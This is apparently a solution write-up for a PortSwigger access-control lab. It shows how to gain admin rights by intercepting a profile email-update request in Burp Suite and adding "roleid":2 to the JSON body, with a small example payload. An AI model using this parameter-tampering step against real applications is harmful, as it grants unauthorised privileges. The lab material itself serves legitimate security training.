# User role can be modified in user profile

## Information
---

- [PortSwigger - Lab: User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)

This lab has an admin panel at /admin. It's only accessible to logged-in users with a roleid of 2.

Solve the lab by accessing the admin panel and using it to delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 

## Solution
---

1. 傳送 email 更新，並利用 **Burp Suite** 攔截。

2. 將 JSON 資料格式中添加 **"roleid":2**。
    ```json
    {
        "email":"H4ck@emaple.com",
		"roleid":2
    }
    ```